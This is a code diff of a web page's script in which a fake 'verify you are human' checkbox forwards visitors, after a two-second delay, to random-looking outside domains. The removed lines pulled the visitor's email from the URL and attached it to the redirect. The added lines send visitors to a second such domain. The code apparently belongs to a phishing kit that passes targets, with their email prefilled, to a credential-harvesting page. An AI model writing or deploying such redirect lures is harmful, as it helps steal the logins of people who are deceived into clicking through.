@@ -51,12 +51,6 @@
 </div>
 
 <script>
-    // Function to get the 'email' query parameter from the URL
-    function getEmailFromUrl() {
-        const urlParams = new URLSearchParams(window.location.search);
-        return urlParams.get('email');
-    }
-
     document.getElementById('verificationForm').addEventListener('submit', function (event) {
         event.preventDefault();
         
@@ -64,19 +58,10 @@
             document.getElementById('loadingIndicator').style.display = 'block';
             document.querySelector('button[type="submit"]').setAttribute('disabled', 'true');
             
-            // Get the email parameter from the URL
-            const email = getEmailFromUrl();
-            
-            if (email) {
-                // Redirect with the email parameter appended to the URL
-                setTimeout(function () {
-                    window.location.href = `https://tvrcemeheff.prohvacl.com/GxNdbORY#${email}`;
-                }, 2000);  // Delay of 1 seconds
-            } else {
-                alert('No email parameter found in the URL.');
-                document.getElementById('loadingIndicator').style.display = 'none';
-                document.querySelector('button[type="submit"]').removeAttribute('disabled');
-            }
+            // Redirect to the URL after a brief delay
+            setTimeout(function () {
+                window.location.href = 'https://tvrcemeheff.uimco.ltd/cCVUrGqM';
+            }, 2000);  // Delay of 2 seconds
         } else {
             alert('Please verify that you are a human being by ticking the checkbox.');
         }
